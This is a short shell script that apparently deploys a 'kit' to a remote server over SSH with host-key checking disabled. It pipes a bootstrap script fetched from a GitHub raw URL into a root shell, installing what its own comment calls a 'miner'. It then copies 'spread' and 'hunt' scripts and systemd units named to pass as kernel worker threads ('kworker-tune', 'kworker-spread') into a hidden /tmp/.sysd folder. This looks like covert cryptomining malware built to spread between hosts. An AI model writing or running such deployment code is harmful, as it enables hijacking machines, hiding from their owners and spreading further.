#!/bin/sh
# throwaway: deploy the kit to host 2 and test it. Run from Git Bash on the desktop:
#   sh _host2_deploy.sh                 # tries root@5.161.247.9
#   sh _host2_deploy.sh patrick@5.161.247.9
set -eu

D=/c/Users/Patrick/OneDrive/Desktop/test1
USER_AT="${1:-root@5.161.247.9}"
RAW=https://raw.githubusercontent.com/ronnissleepy-code/scripts/main
SSH="ssh -i $D/id_key -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o LogLevel=ERROR"
SCP="scp -i $D/id_key -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

echo "== 0. access =="
$SSH "$USER_AT" 'id -un; nproc; grep -m1 "model name" /proc/cpuinfo | cut -d: -f2-'
uid=$($SSH "$USER_AT" 'id -u')
if [ "$uid" = 0 ]; then SUDO=env; else SUDO="sudo -n env"; fi
echo "uid=$uid sudo='$SUDO'"

echo "== 1. bootstrap: binary (hash-checked) + units + miner =="
$SSH "$USER_AT" "curl -fsSL $RAW/bootstrap.sh | $SUDO CONFIG_URL=$RAW sh"

echo "== 2. overlay the local post-push files + units =="
$SCP "$D/tune.sh" "$D/run.sh" "$D/spread.sh" "$D/hunt.sh" "$D/worker.env" \
     "$D/bootstrap.sh" "$D/kworker-tune.service" "$D/kworker-tune.timer" \
     "$D/kworker-spread.service" "$D/_host2_finish.sh" "$USER_AT:/tmp/.sysd/"

echo "== 3. finalise + measure on the host =="
$SSH "$USER_AT" "sh /tmp/.sysd/_host2_finish.sh"

echo "== 4. site latency AFTER (compare with baseline 0.149/0.166/0.192 s) =="
for i in 1 2 3 4 5 6; do
    curl -sk -o /dev/null -w '%{time_total} ' https://5.161.247.9/
done
echo
